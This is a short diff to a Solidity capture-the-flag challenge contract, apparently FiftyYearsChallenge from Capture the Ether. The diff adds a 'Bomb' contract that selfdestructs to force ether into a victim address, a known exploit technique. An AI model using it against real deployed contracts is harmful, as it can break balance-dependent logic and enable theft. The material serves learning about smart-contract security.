@@ -79,3 +79,9 @@ contract FiftyYearsChallenge {
 
     function() external payable {}
 }
+
+contract Bomb {
+    function Bomb(address victim) public payable {
+        selfdestruct(victim);
+    }
+}
